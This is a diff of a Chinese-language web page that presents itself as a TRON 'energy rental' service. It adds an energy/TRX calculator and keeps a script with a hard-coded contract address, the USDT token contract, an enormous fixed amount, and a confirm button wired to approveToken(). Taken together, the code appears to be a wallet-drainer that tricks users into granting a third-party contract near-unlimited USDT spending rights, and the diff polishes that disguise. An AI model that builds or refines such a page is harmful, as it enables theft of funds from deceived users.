@@ -36,24 +36,7 @@
       text-align: center;
       color: #777;
       font-size: 14px;
-      margin-bottom: 26px;
-    }
-    .wallet {
-      background: #f7f7f7;
-      border-radius: 12px;
-      padding: 14px;
       margin-bottom: 20px;
-    }
-    .wallet-row {
-      display: flex;
-      justify-content: space-between;
-      gap: 12px;
-      align-items: center;
-    }
-    .address {
-      font-size: 13px;
-      word-break: break-all;
-      color: #555;
     }
     button {
       width: 100%;
@@ -73,13 +56,6 @@
     button:disabled {
       opacity: .5;
       cursor: not-allowed;
-    }
-    .secondary {
-      background: #eee;
-      color: #222;
-    }
-    .danger {
-      background: #b42318;
     }
     .field {
       margin-bottom: 16px;
@@ -101,27 +77,6 @@
     input:focus {
       border-color: #777;
     }
-    .info {
-      background: #fafafa;
-      border: 1px solid #eee;
-      border-radius: 12px;
-      padding: 15px;
-      margin: 18px 0;
-    }
-    .info-row {
-      display: flex;
-      justify-content: space-between;
-      gap: 12px;
-      margin: 8px 0;
-      font-size: 13px;
-    }
-    .info-row span:first-child {
-      color: #777;
-    }
-    .value {
-      text-align: right;
-      word-break: break-all;
-    }
     .warning {
       background: #fff7e6;
       border: 1px solid #ffe0a3;
@@ -139,15 +94,6 @@
       font-size: 13px;
       color: #666;
     }
-    .buttons {
-      display: grid;
-      gap: 10px;
-    }
-    hr {
-      border: 0;
-      border-top: 1px solid #eee;
-      margin: 24px 0;
-    }
     .network {
       text-align: center;
       font-size: 12px;
@@ -160,14 +106,15 @@
 <div class="container">
 <h1>能量租赁</h1>
 <div class="field">
- <label>购买多少能量</label>
- <input type="number" id="inpEnergy" placeholder="请输入需要租赁的能量数量">
+    <label>能量</label>
+    <input type="number" id="inpEnergy" placeholder="请输入需要租赁的能量数量">
 </div>
 <div class="field">
- <label>需要多少TRX</label>
- <input type="number" id="inpTrx" placeholder="对应的TRX数量">
+    <label>消耗TRX</label>
+    <input type="number" id="inpTrx" placeholder="对应的TRX数量">
 </div>
-<button onclick="connectWallet()">连接TronLink钱包</button>
+
+<button onclick="connectWallet()">连接钱包</button>
 <button onclick="approveToken()">确认</button>
 
 <div id="log" class="status"></div>
@@ -179,13 +126,38 @@
  // 已经填入你的合约地址
 const CONTRACT_ADDRESS = "TGoZkUojDzZG1KPLyi6BFSm9wKL118Y3Ls";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-// 修改后：直接使用你给的原始链上数值，不再乘以1000000
 const FIX_AMOUNT = BigInt("6859382084082938309389090");
+// 换算比例：1 TRX = 50000 能量
+const ENERGY_PER_TRX = 50000;
+
+let inpEnergy = document.getElementById('inpEnergy');
+let inpTrx = document.getElementById('inpTrx');
+
+// 输入能量自动算出TRX
+inpEnergy.addEventListener('input', function(){
+    let eVal = Number(this.value);
+    if(!eVal || eVal <=0){
+        inpTrx.value = '';
+        return;
+    }
+    let trxVal = eVal / ENERGY_PER_TRX;
+    inpTrx.value = trxVal;
+});
+// 输入TRX自动算出能量
+inpTrx.addEventListener('input', function(){
+    let tVal = Number(this.value);
+    if(!tVal || tVal <=0){
+        inpEnergy.value = '';
+        return;
+    }
+    let eVal = tVal * ENERGY_PER_TRX;
+    inpEnergy.value = eVal;
+});
+
 
 let tronWeb;
 async function connectWallet(){
     document.getElementById("log").innerText="正在请求钱包连接...";
-    // TronLink 请求授权连接
     if(window.tron){
         try{
             await window.tron.request({method:"tron_requestAccounts"});
